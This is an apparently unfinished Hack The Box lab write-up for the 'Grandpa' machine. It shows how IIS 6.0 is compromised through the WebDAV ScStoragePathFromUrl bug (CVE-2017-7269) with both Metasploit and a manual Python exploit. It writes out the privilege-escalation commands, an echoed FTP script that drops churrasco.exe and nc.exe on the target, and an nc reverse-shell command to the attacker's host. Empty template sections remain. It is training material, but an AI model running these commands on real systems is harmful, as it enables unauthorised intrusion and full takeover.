# Grandpa - HTB

Grandpa - 10.10.10.14

![](/images/grandpa/1. grandpa.png "Grandpa Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Broad introduction to the machine.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

Summary paragraph.

-1- nmap

-2- 

-3- 

-4- 

-5- 

-6- 

-7- 

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

We start with our usual nmap command:

    nmap -A -T4 10.10.10.14

![](/images/grandpa/2. nmap.png)

We see Port 80 open and that's it. Microsoft IIS 6.0. Let's Google that:

    https://en.wikipedia.org/wiki/Internet_Information_Services

![](/images/grandpa/3. wiki.png)

Windows XP or Server 2003?  Call me crazy, but this machine might be ancient, hence the name Grandpa. Let's do a quick searchsploit for IIS:

    searchsploit IIS 6.0

![](/images/grandpa/4. searchsploit.png)


Okay, lots of remote options, but I don't see a Metasploit module? Since the WebDAV Remote Authentication Bypass seems to have been a big deal, let's try the python version of that one:

To confirm, we will Google one more time:

    microsoft iis 6.0 exploit

![](/images/grandpa/5. google.png)


And two solid results are in the top two:  rapid7 and exploitdb:

    https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl

    https://www.exploit-db.com/exploits/41738

Rapid7 is a metasploit module so let's start there.


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================


    https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl

![](/images/grandpa/6. rapid7_1.png)

![](/images/grandpa/6. rapid7_2.png)


    msfconsole
    
    use exploit/windows/iis/iis_webdav_scstoragepathfromurl

![](/images/grandpa/7. msfconsole.png)


So we need to set RHOSTS, but that's about it on this one:

    set RHOSTS 10.10.10.14

    run

![](/images/grandpa/8. run.png)


We have a meterpreter shell.  Let's see what we have.

    getuid
    
    sysinfo

![](/images/grandpa/.png)


Okay, so the “Access is denied” for getuid is different.  It likely means we have exploited onto this machine as a process or service and not as a user. Let's migrate over to a different process:

    ps
![](/images/grandpa/.png)


Let's try migrating into process 488:
    migrate 488

![](/images/grandpa/.png)

![](/images/grandpa/.png)


Okay, that is better.  Let's background and then run a local exploit suggester to gain system: Ctrl+z

    search suggester

    use 0

    set session 1

    run

![](/images/grandpa/.png)

![](/images/grandpa/.png)


So we have several exploits to choose from. We've used ms10_015_kitrap0d previously, so let's choose something else like ms15_051:

Side note: ms14_070 will also work on this box

    search ms15_051

    use 0
   
    show options

![](/images/grandpa/.png)


Straightforward enough. Set the session to 1 and make sure your Target is set to Windows x86 (should be the default).

    set session 1
    
    run (immediately ctrl+C)

![](/images/grandpa/.png)


Metasploit set us up on the wrong interface, so we need to cancel and then set our lhost and lport:

    set lhost 10.10.14.24

    set lport 17012

    run

![](/images/grandpa/.png)


We received our reverse connection and a new meterpreter shell, so far so good:

    getuid

    shell
    
![](/images/grandpa/.png)


Success! We are system. Let's go get our flags:

    type "C:\Documents and Settings\Administrator\Desktop\root.txt"

    type "C:\Documents and Settings\Harry\Desktop\user.txt"

![](/images/grandpa/.png)


And there are our flags:


<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================


From our initial enumeration we found the following exploit db page: https://www.exploit-db.com/exploits/41738

![](/images/grandpa/.png)


This is the same vulnerability we used via metasploit, but now we can run it manually.  It should already exist on your Kali machine, but if not you can download it from the above website.
Back on Kali:
    searchsploit 41738
Then copy 41738.py to your local directory

![](/images/grandpa/.png)


gedit 41738.py &
Looking through the provided code we see it is a ROP chain against ScStoragePathFromUrl, but no CVE is provided, and the code we have is proof of concept to pop a calc.exe. 
Google "CVE-2017–7269 exploit github"
    A github repo by g0rx should be one of the choices:

![](/images/grandpa/.png)


https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

![](/images/grandpa/.png)


Go to g0rx's “iis6 reverse shell” and click the Raw view
    copy/paste the code into your own “exploit.py” on Kali:

![](/images/grandpa/.png)


So our command to exploit will be:
    python exploit.py 10.10.10.14 80 10.10.14.24 17011

First we need to set up a nc listener on port 17011 to catch the reverse connection. In a separate terminal window:
    nc -lvnp 17011

![](/images/grandpa/.png)


Note: This python exploit appears to only work once before requiring a reset of the box. So if you are trying it multiple times, reset Grandpa first.
Now back in the first terminal window, send the exploit:

![](/images/grandpa/.png)


This window should appear to hang, but over in your nc listener window you should see:

![](/images/grandpa/.png)


Now we have a shell on the machine, let's see what privileges we have:
 
    whoami

![](/images/grandpa/.png)


So we are a low-privileged network service. Time to privesc! 

First, let's grab our systeminfo and run it against a Windows exploit suggester back on Kali.  In your windows shell:

    systeminfo

![](/images/grandpa/.png)

<output snipped>

Now, copy/paste all of the output to a “grandpa.systeminfo” back on your Kali machine:

![](/images/grandpa/.png)


Save the grandpa.systeminfo file.
Now we need to update our windows-exploit-suggester:
    ./windows-exploit-suggester.py -u

![](/images/grandpa/.png)


Now we can run the exploit suggester script against the systeminfo file:
    ./windows-exploit-suggester.py -i /root/labs/htb/grandpa/grandpa.systeminfo -d 2020-05-09-mssb.xls

You will get an extensive list of exploits to try on this machine.  However there is an different way to privesc through token smuggling:
    https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e

Kali linux normally has “churrasco.exe” already installed here:
    /usr/share/sqlninja/apps/churrasco.exe

We will also need a nc.exe file to use.  Kali has one here:  
    /usr/share/sqlninja/apps/nc.exe

Copy both of those files to your working directory.

![](/images/grandpa/.png)


Now we can run ftp to transfer the files over to Grandpa using ftp:
    On your Kali machine: python -m pyftpdlib -p21

![](/images/grandpa/.png)


Over on your windows shell (grandpa):
    echo open 10.10.14.24 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET churrasco.exe >> ftp.txt&echo bye>> ftp.txt
    ftp -v -n -s:ftp.txt
   ⇒ del ftp.txt
    echo open 10.10.14.24 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe >> ftp.txt&echo bye>> ftp.txt
    ftp -v -n -s:ftp.txt

![](/images/grandpa/.png)

(note: I only show one set of the commands above, for churrasco.exe. you need to repeat the steps for nc.exe as well)

On your Kali terminal window you should see the ftp connections and transfer:
 
 ![](/images/grandpa/.png)


Next, we set up a listener on Kali to catch our reverse connection:
    nc -lvnp 17013

![](/images/grandpa/.png)


Then over on grandpa:
    churrasco.exe -d "C:\Windows\Temp\nc.exe 10.10.14.24 17013 -e cmd.exe"

![](/images/grandpa/.png)


And back in our Kali terminal:

![](/images/grandpa/.png)


Success! We are system. Let's go get our flags:
    type "C:\Documents and Settings\Administrator\Desktop\root.txt"
    type "C:\Documents and Settings\Harry\Desktop\user.txt"

![](/images/grandpa/.png)


And there are our flags:


<p>&nbsp;</p>
=======================================================

## Final Code

=======================================================

<file-name.py/.sh>

    insert code here
    # code blocks ignore the rest of markdown formatting
    # so you can leave # characters to denote comments
    # without setting new headings
        

<p>&nbsp;</p>
=======================================================

## Links & Additional Reading

=======================================================

1. Link: []()
2. Link: []()
3. Link: []()
4. Link: []()
5. Link: []()

<p>&nbsp;</p>
=======================================================

## Basic formatting

=======================================================

You can use *italics*, **bold**, `code font text`, and create [links](https://www.markdownguide.org/cheat-sheet/). Here's a footnote [^1]. Here's a horizontal rule:

<p>&nbsp;</p>

=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
